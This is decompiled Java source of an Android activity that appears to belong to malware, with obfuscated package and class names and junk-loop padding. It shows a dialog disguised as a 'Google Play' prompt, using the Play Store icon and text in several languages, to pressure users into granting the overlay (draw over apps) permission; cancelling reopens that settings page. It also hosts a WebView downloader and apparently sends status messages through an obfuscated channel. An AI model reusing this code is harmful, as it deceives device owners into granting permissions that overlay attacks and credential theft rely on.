package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.DownloadManager;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.view.ContextThemeWrapper;
import android.view.View;
import android.webkit.DownloadListener;
import android.webkit.URLUtil;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.widget.FrameLayout;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0045d;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38;
import java.util.Locale;
import org.chromium.net.C0116R;
/* loaded from: classes.dex */
public class hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31 extends Activity {

    /* renamed from: a */
    private View.OnClickListener f407a = new View$OnClickListenerC0101d();

    /* renamed from: b */
    private View.OnClickListener f408b = new View$OnClickListenerC0102e();

    /* renamed from: c */
    WebView f409c;

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$a */
    /* loaded from: classes.dex */
    public class DialogInterface$OnClickListenerC0098a implements DialogInterface.OnClickListener {
        DialogInterface$OnClickListenerC0098a() {
        }

        @Override // android.content.DialogInterface.OnClickListener
        public void onClick(DialogInterface dialogInterface, int i) {
            hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31.this.startActivityForResult(new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION", Uri.parse("package:" + hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31.this.getPackageName())), 0);
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$b */
    /* loaded from: classes.dex */
    public class DialogInterface$OnClickListenerC0099b implements DialogInterface.OnClickListener {
        DialogInterface$OnClickListenerC0099b(hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31 hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31Var) {
        }

        @Override // android.content.DialogInterface.OnClickListener
        public void onClick(DialogInterface dialogInterface, int i) {
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$c */
    /* loaded from: classes.dex */
    public class DialogInterface$OnCancelListenerC0100c implements DialogInterface.OnCancelListener {
        DialogInterface$OnCancelListenerC0100c() {
        }

        @Override // android.content.DialogInterface.OnCancelListener
        public void onCancel(DialogInterface dialogInterface) {
            hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31.this.startActivityForResult(new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION", Uri.parse("package:" + hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31.this.getPackageName())), 0);
        }
    }

    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$d */
    /* loaded from: classes.dex */
    class View$OnClickListenerC0101d implements View.OnClickListener {
        View$OnClickListenerC0101d() {
        }

        @Override // android.view.View.OnClickListener
        public void onClick(View view) {
            try {
                hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31.this.finish();
            } catch (Exception unused) {
            }
        }
    }

    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$e */
    /* loaded from: classes.dex */
    class View$OnClickListenerC0102e implements View.OnClickListener {
        View$OnClickListenerC0102e() {
        }

        @Override // android.view.View.OnClickListener
        public void onClick(View view) {
            try {
                Intent intent = new Intent("android.settings.WIFI_SETTINGS");
                intent.setFlags(1879048192);
                hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31.this.startActivity(intent);
            } catch (Exception unused) {
            }
        }
    }

    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$f */
    /* loaded from: classes.dex */
    class C0103f implements DownloadListener {
        C0103f() {
        }

        @Override // android.webkit.DownloadListener
        public void onDownloadStart(String str, String str2, String str3, String str4, long j) {
            try {
                DownloadManager.Request request = new DownloadManager.Request(Uri.parse(str));
                String guessFileName = URLUtil.guessFileName(str, str3, str4);
                request.allowScanningByMediaScanner();
                request.setNotificationVisibility(1);
                request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, guessFileName);
                ((DownloadManager) hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31.this.getSystemService("download")).enqueue(request);
            } catch (Exception unused) {
                Boolean bool = Boolean.TRUE;
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
            }
        }
    }

    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31$g */
    /* loaded from: classes.dex */
    public class C0104g extends WebChromeClient {

        /* renamed from: a */
        private View f415a;

        /* renamed from: b */
        private WebChromeClient.CustomViewCallback f416b;

        /* renamed from: c */
        private int f417c;

        /* renamed from: d */
        private int f418d;

        C0104g() {
        }

        @Override // android.webkit.WebChromeClient
        public Bitmap getDefaultVideoPoster() {
            if (this.f415a == null) {
                return null;
            }
            return BitmapFactory.decodeResource(hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31.this.getApplicationContext().getResources(), 2130837573);
        }

        @Override // android.webkit.WebChromeClient
        public void onHideCustomView() {
            ((FrameLayout) hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31.this.getWindow().getDecorView()).removeView(this.f415a);
            this.f415a = null;
            hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31.this.getWindow().getDecorView().setSystemUiVisibility(this.f418d);
            hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31.this.setRequestedOrientation(this.f417c);
            this.f416b.onCustomViewHidden();
            this.f416b = null;
        }

        @Override // android.webkit.WebChromeClient
        public void onShowCustomView(View view, WebChromeClient.CustomViewCallback customViewCallback) {
            if (this.f415a != null) {
                onHideCustomView();
                return;
            }
            this.f415a = view;
            this.f418d = hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31.this.getWindow().getDecorView().getSystemUiVisibility();
            this.f417c = hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31.this.getRequestedOrientation();
            this.f416b = customViewCallback;
            ((FrameLayout) hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31.this.getWindow().getDecorView()).addView(this.f415a, new FrameLayout.LayoutParams(-1, -1));
            hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31.this.getWindow().getDecorView().setSystemUiVisibility(3846);
        }
    }

    /* renamed from: a */
    private void m102a() {
        char c;
        String str;
        AlertDialog.Builder builder = new AlertDialog.Builder(new ContextThemeWrapper(this, (int) C0116R.style.AlertDialogCustom));
        String language = Locale.getDefault().getLanguage();
        int hashCode = language.hashCode();
        if (hashCode == 3121) {
            if (language.equals("ar")) {
                c = 1;
            }
            c = 65535;
        } else if (hashCode == 3179) {
            if (language.equals("cn")) {
                c = 2;
            }
            c = 65535;
        } else if (hashCode != 3241) {
            if (hashCode == 3710 && language.equals("tr")) {
                c = 3;
            }
            c = 65535;
        } else {
            if (language.equals("en")) {
                c = 0;
            }
            c = 65535;
        }
        String str2 = "Cancel";
        if (c == 0) {
            builder.setMessage("Enable Draw Over Apps For: " + getString(C0116R.string.subscriberf62));
            str = "Enable";
        } else if (c == 1) {
            builder.setMessage("تمكين ، الإظهار فوق التطبيقات لـ: " + getString(C0116R.string.subscriberf62));
            str = "تفعيل";
            str2 = "إلغاء";
        } else if (c == 2) {
            builder.setMessage("请启用，显示在应用程序:" + getString(C0116R.string.subscriberf62));
            str = "使能够";
            str2 = "取消";
        } else if (c != 3) {
            builder.setMessage("Enable Draw Over Apps For: " + getString(C0116R.string.subscriberf62));
            str = "OK";
        } else {
            builder.setMessage("diğer uygulamalar üzerinde çizimi etkinleştir:" + getString(C0116R.string.subscriberf62));
            str = "Tamam";
            str2 = "iptal";
        }
        try {
            try {
                builder.setIcon(hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.f285s.getPackageManager().getApplicationIcon("com.android.vending"));
                builder.setTitle("Google Play");
            } catch (PackageManager.NameNotFoundException unused) {
                Boolean bool = Boolean.TRUE;
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
            }
        } catch (PackageManager.NameNotFoundException unused2) {
            builder.setIcon(hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.f285s.getPackageManager().getApplicationIcon(getPackageName()));
            builder.setTitle(getString(C0116R.string.subscriberf62));
        }
        builder.setPositiveButton(str, new DialogInterface$OnClickListenerC0098a());
        builder.setNegativeButton(str2, new DialogInterface$OnClickListenerC0099b(this));
        builder.setOnCancelListener(new DialogInterface$OnCancelListenerC0100c());
        builder.show();
    }

    /* renamed from: b */
    private boolean m101b(Context context) {
        NetworkInfo activeNetworkInfo = ((ConnectivityManager) context.getSystemService("connectivity")).getActiveNetworkInfo();
        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
    }

    @Override // android.app.Activity
    public void finish() {
        if (oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.f384o) {
            oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.m117j(C0045d.f191f, " ".getBytes());
        }
        super.finish();
    }

    @Override // android.app.Activity
    protected void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
    }

    @Override // android.app.Activity
    public void onBackPressed() {
        try {
            if (this.f409c == null || !this.f409c.canGoBack()) {
                super.onBackPressed();
            } else {
                this.f409c.goBack();
            }
        } catch (NullPointerException unused) {
            super.onBackPressed();
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:57:0x00fa, code lost:
        if (r2.equals("en") != false) goto L42;
     */
    @Override // android.app.Activity
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public void onCreate(android.os.Bundle r9) {
        /*
            Method dump skipped, instructions count: 466
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.hicgmymnkjkwrzcdhoisrzmhnojnjbfrspcafmyeaqopxgyunb31.onCreate(android.os.Bundle):void");
    }

    @Override // android.app.Activity
    protected void onDestroy() {
        if (oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.f384o) {
            oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.m117j(C0045d.f191f, " ".getBytes());
        }
        super.onDestroy();
    }

    @Override // android.app.Activity
    protected void onRestoreInstanceState(Bundle bundle) {
        super.onRestoreInstanceState(bundle);
        WebView webView = this.f409c;
        if (webView != null) {
            webView.restoreState(bundle);
        }
    }

    @Override // android.app.Activity
    protected void onSaveInstanceState(Bundle bundle) {
        super.onSaveInstanceState(bundle);
        WebView webView = this.f409c;
        if (webView != null) {
            webView.saveState(bundle);
        }
    }
}
